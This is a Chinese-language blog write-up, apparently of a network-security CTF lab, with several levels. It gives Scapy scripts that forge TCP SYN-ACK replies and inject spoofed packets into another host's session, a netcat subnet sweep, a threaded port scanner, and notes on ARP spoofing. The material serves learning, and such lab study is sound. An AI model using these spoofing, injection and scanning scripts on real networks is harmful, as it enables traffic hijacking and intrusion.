<li><p>一种是构造arp相应包，声称<code>10.0.0.2</code>的mac地址是<code>10.0.0.3</code>。（✔这种方式应该是观念上正确的）</p>
</li>
</ul>
<p>这两种都正确吗？在这个场景中，<code>10.0.0.4</code>想要发起tcp三次握手，但他不知道<code>10.0.0.2</code>的mac地址，首先他会发起<code>ARP broadcast</code>询问谁有<code>10.0.0.2</code>的mac地址。</p>
<ul>
<li>如果你采用第一种方式，你确实会收到<code>10.0.0.4</code>发来的tcp第一次握手的数据包。但是后续使用<code>scapy</code>构造的tcp第二次握手的应答数据包，却无法发送到<code>10.0.0.4</code>。—<strong>这里不知道为什么</strong></li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> TCP<span class="token punctuation">,</span> sr1<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> sniff<span class="token punctuation">,</span> Ether<span class="token punctuation">,</span> send<span class="token punctuation">,</span> sendp

mac_2 <span class="token operator">=</span> <span class="token string">"36:11:33:c5:63:50"</span>
mac_3 <span class="token operator">=</span> <span class="token string">"ea:5e:73:56:03:6f"</span>
mac_4 <span class="token operator">=</span> <span class="token string">"b2:b3:5c:60:01:08"</span>

<span class="token keyword">def</span> <span class="token function">handle_packet</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span>  <span class="token string">"IP"</span> <span class="token keyword">in</span> packet <span class="token keyword">and</span> <span class="token string">"TCP"</span> <span class="token keyword">in</span> packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>

        <span class="token keyword">if</span> packet<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"S"</span><span class="token punctuation">:</span>
            ether <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>mac_2<span class="token punctuation">,</span>dst<span class="token operator">=</span>mac_4<span class="token punctuation">)</span>
            ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span><span class="token string">"10.0.0.2"</span><span class="token punctuation">,</span>dst<span class="token operator">=</span><span class="token string">"10.0.0.4"</span><span class="token punctuation">)</span>
            tcp_ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>seq<span class="token operator">=</span><span class="token number">456132</span><span class="token punctuation">,</span> ack<span class="token operator">=</span>packet<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">,</span> dport<span class="token operator">=</span>packet<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">,</span> sport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">)</span>
            send_packet <span class="token operator">=</span> ether <span class="token operator">/</span> ip <span class="token operator">/</span> tcp_
            send_packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
            tcp_3 <span class="token operator">=</span> send<span class="token punctuation">(</span>send_packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>

        <span class="token comment"># 如果有 TCP 负载，打印负载信息</span>
        <span class="token keyword">if</span> packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Payload: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>

        
sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>handle_packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>注意<code>ack=(pkt.seq + len(pkt[Raw].payload)</code>。 <code>ack</code>和符号标志位的<code>ACK</code>是不一样的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> TCP<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> sniff<span class="token punctuation">,</span> Ether<span class="token punctuation">,</span> send<span class="token punctuation">,</span> sendp<span class="token punctuation">,</span> Raw

mac_2 <span class="token operator">=</span> <span class="token string">"0a:be:cb:0c:2f:c3"</span>
mac_3 <span class="token operator">=</span> <span class="token string">"4a:3c:5e:46:45:9e"</span>
mac_4 <span class="token operator">=</span> <span class="token string">"7e:2b:6a:5e:37:b0"</span>
mac_ <span class="token operator">=</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">handle_packet</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    <span class="token keyword">if</span>  <span class="token string">"IP"</span> <span class="token keyword">in</span> packet <span class="token keyword">and</span> <span class="token string">"TCP"</span> <span class="token keyword">in</span> packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span> <span class="token keyword">and</span> packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">==</span> <span class="token string">"10.0.0.3"</span> <span class="token keyword">and</span> \
        packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dst <span class="token operator">==</span> <span class="token string">"10.0.0.4"</span> <span class="token keyword">and</span> packet<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Raw<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">b'COMMANDS:'</span> <span class="token keyword">in</span> packet<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">:</span>

        ether <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>mac_2<span class="token punctuation">,</span> dst<span class="token operator">=</span>mac_3<span class="token punctuation">)</span>
        ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span><span class="token string">"10.0.0.4"</span><span class="token punctuation">,</span> dst<span class="token operator">=</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">)</span>
        tcp_ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>seq<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> sport<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">)</span>
        payload <span class="token operator">=</span> Raw<span class="token punctuation">(</span><span class="token string">b'FLAG\n'</span><span class="token punctuation">)</span>
        send_packet <span class="token operator">=</span>  ip <span class="token operator">/</span> tcp_ <span class="token operator">/</span> payload
        sendp<span class="token punctuation">(</span>send_packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>

    <span class="token comment"># 如果有 TCP 负载，打印负载信息</span>
    <span class="token keyword">if</span> packet<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span> <span class="token keyword">and</span> packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>packet<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">inject</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Print packets</span>
    <span class="token keyword">if</span>  <span class="token string">"IP"</span> <span class="token keyword">in</span> pkt <span class="token keyword">and</span> <span class="token string">"TCP"</span> <span class="token keyword">in</span> pkt<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--- PKT: ---"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"src: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">&#125;</span></span><span class="token string">, dst: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"sport: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">&#125;</span></span><span class="token string">, dport: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"seq: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">.</span>seq<span class="token punctuation">&#125;</span></span><span class="token string">, ack: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">.</span>ack<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flags: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>Raw <span class="token keyword">in</span> pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"load: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token comment">#pkt[TCP].dport pkt[IP].dst</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                sendp<span class="token punctuation">(</span>Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">,</span> dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span> <span class="token operator">/</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">,</span>
                dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">,</span> seq<span class="token operator">=</span>pkt<span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span><span class="token punctuation">(</span>pkt<span class="token punctuation">.</span>
                seq <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"PA"</span><span class="token punctuation">)</span> <span class="token operator">/</span> Raw<span class="token punctuation">(</span>load<span class="token operator">=</span><span class="token string">"FLAG\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span> <span class="token comment"># ack这个步骤没有加上len</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">.</span>time<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>

sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>inject<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>







<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>写bash脚本的能力还是要学习一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># !/bin/sh</span>
<span class="token assign-left variable">subnet</span><span class="token operator">=</span><span class="token string">"10.0.0"</span>
<span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">31337</span>

<span class="token keyword">for</span> <span class="token for-or-select variable">ip</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">..</span><span class="token number">255</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> 
<span class="token keyword">do</span>
    <span class="token assign-left variable">target_ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$subnet</span>.<span class="token variable">$ip</span>"</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"Trying <span class="token variable">$target_ip</span> on port <span class="token variable">$port</span>..."</span> 
    <span class="token assign-left variable">response</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">nc</span> <span class="token parameter variable">-w</span> <span class="token number">1</span> $target_ip <span class="token number">31337</span><span class="token variable">)</span></span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$response</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
        <span class="token builtin class-name">echo</span> <span class="token string">"Connected to <span class="token variable">$target_ip</span>"</span>
        <span class="token builtin class-name">echo</span> <span class="token string">"Flag: <span class="token variable">$response</span>"</span>
        <span class="token builtin class-name">break</span>
    <span class="token keyword">fi</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> threading

<span class="token comment"># 远程子网和端口</span>
subnet <span class="token operator">=</span> <span class="token string">"10.0"</span>
port <span class="token operator">=</span> <span class="token number">31337</span>
max_threads <span class="token operator">=</span> <span class="token number">100</span>  <span class="token comment"># 最大线程数</span>

<span class="token comment"># 尝试连接给定的IP和端口</span>
<span class="token keyword">def</span> <span class="token function">try_connect</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 设置超时时间为1秒</span>
            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connected to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></span><span class="token string"> on port </span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token comment"># 接收 flag 或响应</span>
            response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>timeout<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ConnectionRefusedError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error connecting to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 线程池管理</span>
<span class="token keyword">def</span> <span class="token function">threader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        try_connect<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 构建IP地址池</span>
<span class="token keyword">def</span> <span class="token function">generate_ips</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">yield</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>subnet<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

<span class="token comment"># 主函数</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue

    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># 创建多个线程</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>max_threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>threader<span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 设置为守护线程</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># 将所有IP地址放入队列</span>
    <span class="token keyword">for</span> ip <span class="token keyword">in</span> generate_ips<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>

    <span class="token comment"># 等待所有任务完成</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Scanning complete."</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>使用tcpdump将网络数据包保存成<code>test.pcap</code>,再用wireshark打开，查看tcp流的数据就能够得到完成的flag文件了</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">I don't know enough to speak on real world feasibility/mitigations/etc but I can talk about how the challenge works.

`I'm going to assume that when I add the IP, it sends a request to the router, telling it to update its table for what IP is tied to which device.`

No request is sent when you configure your IP, you're simply telling your own machine that it should consider itself as 10.0.0.2 and behave accordingly. This means that it will start answering ARP requests and accepting packets for 10.0.0.2.
That first part is important. 10.0.0.4 is set up to ARP-query for 10.0.0.2 every second, and since our host now thinks that it has IP address 10.0.0.2, it replies with an is-at. 10.0.0.4 then simply believes our ARP response and redirects its traffic to us.

It's important to note that, at least within this challenge, there is no authoritative list of who has which IP address. There is no router. Instead, IPs are simply resolved by asking who has them and trusting that you get a truthful response.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个里面是没有路由器的，但是为什么我发送arp的欺骗包，在这一关中是不起作用的呢？</p>
<p>如果 <strong>IP 地址 10.0.0.3</strong> 的主机绑定了 <strong>10.0.0.2</strong> 的 IP 地址，而另一台主机 <strong>10.0.0.4</strong> 想与 <strong>10.0.0.2</strong> 建立连接，网络流量的具体走向取决于 ARP 解析过程以及主机和交换机的配置。下面是详细分析：</p>
<h4 id="1-正常的-ARP-解析流程"><a href="#1-正常的-ARP-解析流程" class="headerlink" title="1. 正常的 ARP 解析流程"></a>1. <strong>正常的 ARP 解析流程</strong></h4><p>在没有 IP 地址冲突或 ARP 欺骗的情况下，当 <strong>10.0.0.4</strong> 想与 <strong>10.0.0.2</strong> 建立连接时，它需要首先通过 ARP（地址解析协议）解析 <strong>10.0.0.2</strong> 的 MAC 地址。这是正常流程的简要说明：</p>
<ol>
<li><strong>10.0.0.4</strong> 发送一个 <strong>ARP 请求</strong>，询问网络上 “谁是 10.0.0.2？请告诉我 10.0.0.2 的 MAC 地址。”</li>
<li>如果网络中有一台主机真正绑定了 <strong>10.0.0.2</strong>（例如原始的 <strong>10.0.0.2</strong> 主机），它会响应这个 ARP 请求，提供自己的 MAC 地址。</li>
<li><strong>10.0.0.4</strong> 把这个 MAC 地址缓存在自己的 ARP 表中，并使用该 MAC 地址将后续的数据包发送到 <strong>10.0.0.2</strong>。</li>
</ol>
<h4 id="2-当-10-0-0-3-绑定了-10-0-0-2"><a href="#2-当-10-0-0-3-绑定了-10-0-0-2" class="headerlink" title="2.当 10.0.0.3 绑定了 10.0.0.2"></a>2.<strong>当 10.0.0.3 绑定了 10.0.0.2</strong></h4><p>现在引入一个特殊情况：<strong>10.0.0.3</strong> 主机绑定了 <strong>10.0.0.2</strong> 的 IP 地址。这意味着 <strong>10.0.0.3</strong> 主机可以响应 ARP 请求，并声称它是 <strong>10.0.0.2</strong>。具体情况将取决于是否发生了 ARP 冲突或者 ARP 欺骗。</p>
<h4 id="情况-1：ARP-请求被-10-0-0-3-抢先响应"><a href="#情况-1：ARP-请求被-10-0-0-3-抢先响应" class="headerlink" title="情况 1：ARP 请求被 10.0.0.3 抢先响应"></a>情况 1：<strong>ARP 请求被 10.0.0.3 抢先响应</strong></h4><ul>
<li>如果 <strong>10.0.0.3</strong> 绑定了 <strong>10.0.0.2</strong>，并且抢先响应了 <strong>10.0.0.4</strong> 的 ARP 请求，它会告诉 <strong>10.0.0.4</strong> “我是 10.0.0.2，我的 MAC 地址是 [10.0.0.3 的 MAC 地址]。”</li>
<li>由于 ARP 是无状态的，只要谁抢先响应，<strong>10.0.0.4</strong> 就会相信这个响应，并将 <strong>10.0.0.2</strong> 对应的 MAC 地址更新为 <strong>10.0.0.3</strong> 的 MAC 地址。</li>
<li>这样，<strong>10.0.0.4</strong> 后续发送给 <strong>10.0.0.2</strong> 的所有数据包都会发送到 <strong>10.0.0.3</strong>（因为 <strong>10.0.0.4</strong> 的 ARP 表中记录了 <strong>10.0.0.2</strong> 的 MAC 地址实际上是 <strong>10.0.0.3</strong> 的 MAC 地址）。</li>
</ul>
<h4 id="情况-2：10-0-0-2-的主机与-10-0-0-3-都响应了-ARP-请求"><a href="#情况-2：10-0-0-2-的主机与-10-0-0-3-都响应了-ARP-请求" class="headerlink" title="情况 2：10.0.0.2 的主机与 10.0.0.3 都响应了 ARP 请求"></a>情况 2：<strong>10.0.0.2 的主机与 10.0.0.3 都响应了 ARP 请求</strong></h4><ul>
<li><p>如果网络中同时有真正的 <strong>10.0.0.2</strong> 和伪装的 <strong>10.0.0.2</strong>（即 <strong>10.0.0.3</strong> 绑定了 <strong>10.0.0.2</strong>），这就可能引发 <strong>ARP 冲突</strong>。</p>
</li>
<li><p>10.0.0.2 和 10.0.0.3 都可能响应 10.0.0.4 的 ARP 请求。此时，结果取决于谁先响应以及交换机或网络的处理方式：</p>
<ul>
<li><strong>如果 10.0.0.3 先响应</strong>，则 <strong>10.0.0.4</strong> 可能会认为 <strong>10.0.0.2</strong> 是 <strong>10.0.0.3</strong>，并将数据包发往 <strong>10.0.0.3</strong>。</li>
<li><strong>如果真正的 10.0.0.2 响应更快</strong>，则 <strong>10.0.0.4</strong> 仍然会向正确的主机发送数据。</li>
</ul>
<p>由于 ARP 是动态的，网络中的设备可以随时发送更新的 ARP 响应。因此，ARP 冲突可能会导致通信不稳定，甚至反复切换目标主机。</p>
</li>
</ul>
<h4 id="情况-3：10-0-0-3-主动进行-ARP-欺骗"><a href="#情况-3：10-0-0-3-主动进行-ARP-欺骗" class="headerlink" title="情况 3：10.0.0.3 主动进行 ARP 欺骗"></a>情况 3：<strong>10.0.0.3 主动进行 ARP 欺骗</strong></h4><ul>
